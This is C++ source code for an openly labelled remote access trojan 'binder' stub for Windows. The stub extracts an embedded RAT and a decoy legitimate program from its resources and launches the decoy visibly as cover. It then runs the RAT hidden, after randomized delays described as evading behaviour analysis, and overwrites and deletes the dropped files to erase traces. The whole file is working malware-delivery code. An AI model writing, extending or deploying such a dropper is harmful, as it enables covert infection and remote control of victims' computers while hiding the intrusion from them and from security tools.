#include <iostream>
#include <windows.h>
#include <string>
#include <fstream>
#include <vector>
#include <shlobj.h>
#include <time.h>

// RAT Client Binder v1.6 - Resource Extraction Stub
// This file gets compiled with embedded RAT client v1.6 and legitimate application
// Compatible with all v1.6 features including screen sharing, interactive shell, etc.

// Resource IDs (defined in resources.rc during binding)
#define RAT_CLIENT_RESOURCE 101
#define LEGIT_APP_RESOURCE 102

// Enhanced random string generation for better evasion
std::string generateRandomString(int length)
{
    SYSTEMTIME st;
    GetSystemTime(&st);
    srand((st.wMilliseconds * st.wSecond) ^ (GetTickCount() * GetCurrentProcessId()));

    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::string result;
    result.resize(length);

    for (int i = 0; i < length; i++)
    {
        Sleep(1); // Add entropy
        result[i] = charset[rand() % (sizeof(charset) - 1)];
    }

    return result;
}

// Enhanced file saving with support for larger v1.6 clients (screen sharing increases size significantly)
bool saveToFile(const std::string &filename, const std::vector<unsigned char> &data)
{
    // Random delay for evasion
    Sleep(50 + (rand() % 100));

    std::ofstream file(filename, std::ios::binary);
    if (!file.is_open())
    {
        return false;
    }

    // Write data in chunks to handle large v1.6 clients efficiently
    // v1.6 clients with screen sharing can be 2-5MB+ due to GDI+ libraries
    const size_t chunkSize = 16384; // 16KB chunks for better performance
    for (size_t i = 0; i < data.size(); i += chunkSize)
    {
        size_t currentChunkSize = (chunkSize < (data.size() - i)) ? chunkSize : (data.size() - i);
        file.write(reinterpret_cast<const char*>(&data[i]), currentChunkSize);
        
        if (file.fail())
        {
            file.close();
            return false;
        }
        
        // Small delay to avoid detection by behavior analysis
        if (i % (chunkSize * 10) == 0) // Every 160KB
        {
            Sleep(1);
        }
    }

    file.close();
    return true;
}

// Extract resource from executable with enhanced error handling for large files
std::vector<unsigned char> extractResource(int resourceId)
{
    std::vector<unsigned char> data;

    HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(resourceId), RT_RCDATA);
    if (!hResource)
    {
        return data; // Empty vector indicates failure
    }

    HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
    if (!hLoadedResource)
    {
        return data;
    }

    LPVOID pLockedResource = LockResource(hLoadedResource);
    if (!pLockedResource)
    {
        return data;
    }

    DWORD resourceSize = SizeofResource(NULL, hResource);
    if (resourceSize == 0)
    {
        return data;
    }

    // Reserve space for potentially large v1.6 clients (can be several MB)
    data.reserve(resourceSize);
    data.resize(resourceSize);

    // Copy resource data
    memcpy(&data[0], pLockedResource, resourceSize);

    return data;
}

// Get temporary directory with better path handling
std::string getTempDirectory()
{
    char tempPath[MAX_PATH];
    DWORD result = GetTempPathA(MAX_PATH, tempPath);
    
    if (result == 0 || result > MAX_PATH)
    {
        // Fallback to current directory
        return ".\\";
    }

    return std::string(tempPath);
}

// Enhanced process execution with better error handling and stealth
bool executeFile(const std::string &filepath, bool waitForCompletion = false, bool hideWindow = true)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = hideWindow ? SW_HIDE : SW_SHOWNORMAL;
    ZeroMemory(&pi, sizeof(pi));

    // Create a copy of the filepath for CreateProcess (it may modify the string)
    std::string cmdLine = filepath;
    
    DWORD creationFlags = hideWindow ? CREATE_NO_WINDOW : 0;
    
    BOOL success = CreateProcessA(
        NULL,                   // No module name (use command line)
        &cmdLine[0],           // Command line
        NULL,                   // Process handle not inheritable
        NULL,                   // Thread handle not inheritable
        FALSE,                  // Set handle inheritance to FALSE
        creationFlags,          // Creation flags
        NULL,                   // Use parent's environment block
        NULL,                   // Use parent's starting directory
        &si,                    // Pointer to STARTUPINFO structure
        &pi                     // Pointer to PROCESS_INFORMATION structure
    );

    if (!success)
    {
        return false;
    }

    if (waitForCompletion)
    {
        // Wait for the process to complete
        WaitForSingleObject(pi.hProcess, INFINITE);
    }

    // Close process and thread handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return true;
}

// Clean up temporary files with enhanced security (multiple pass deletion)
void cleanupFile(const std::string &filepath)
{
    // Get file size for overwriting
    std::ifstream file(filepath, std::ios::binary | std::ios::ate);
    if (file.is_open())
    {
        std::streamsize size = file.tellg();
        file.close();

        // Overwrite file with random data before deletion (3 passes)
        for (int pass = 0; pass < 3; pass++)
        {
            std::ofstream overwrite(filepath, std::ios::binary);
            if (overwrite.is_open())
            {
                for (std::streamsize i = 0; i < size; i++)
                {
                    overwrite.put(rand() % 256);
                }
                overwrite.close();
            }
            Sleep(10); // Small delay between passes
        }
    }

    // Delete the file
    DeleteFileA(filepath.c_str());
    
    // Additional cleanup attempt
    Sleep(100);
    DeleteFileA(filepath.c_str());
}

// Main binder logic with v1.6 compatibility and enhanced stealth
int main()
{
    // Initialize random seed with multiple entropy sources
    srand(GetTickCount() ^ GetCurrentProcessId() ^ (DWORD)(uintptr_t)GetCurrentThread());

    // Add random delay for evasion (1-3 seconds)
    Sleep(1000 + (rand() % 2000));

    try
    {
        // Get temporary directory
        std::string tempDir = getTempDirectory();
        
        // Generate random filenames for extracted files (longer names for better evasion)
        std::string ratClientFile = tempDir + generateRandomString(12) + ".exe";
        std::string legitAppFile = tempDir + generateRandomString(12) + ".exe";

        // Extract RAT client v1.6 (resource 101)
        // This should be a large file due to screen sharing and GDI+ dependencies
        std::vector<unsigned char> ratClientData = extractResource(RAT_CLIENT_RESOURCE);
        if (ratClientData.empty())
        {
            return 1; // Silent failure
        }

        // Extract legitimate application (resource 102)
        std::vector<unsigned char> legitAppData = extractResource(LEGIT_APP_RESOURCE);
        if (legitAppData.empty())
        {
            return 1; // Silent failure
        }

        // Validate that we have a reasonable size for v1.6 client (should be > 1MB with screen sharing)
        if (ratClientData.size() < 500000) // Less than 500KB is suspicious for v1.6
        {
            // Still proceed but this might be an older version
        }

        // Save extracted files to disk
        if (!saveToFile(ratClientFile, ratClientData))
        {
            return 1; // Silent failure
        }

        if (!saveToFile(legitAppFile, legitAppData))
        {
            cleanupFile(ratClientFile);
            return 1; // Silent failure
        }

        // Execute legitimate application first (for cover)
        // Don't hide the legitimate app window - user should see it
        executeFile(legitAppFile, false, false);

        // Longer delay before executing RAT client to avoid correlation
        Sleep(2000 + (rand() % 3000)); // 2-5 seconds

        // Execute RAT client v1.6 in background (hidden)
        // v1.6 will establish persistence and start screen sharing capabilities
        executeFile(ratClientFile, false, true);

        // Wait longer before cleanup to ensure RAT client has started properly
        // v1.6 needs time to initialize GDI+, establish persistence, etc.
        Sleep(8000 + (rand() % 4000)); // 8-12 seconds

        // Clean up extracted files after execution
        cleanupFile(ratClientFile);
        cleanupFile(legitAppFile);

        return 0; // Success
    }
    catch (...)
    {
        // Silent failure on any exception
        return 1;
    }
}
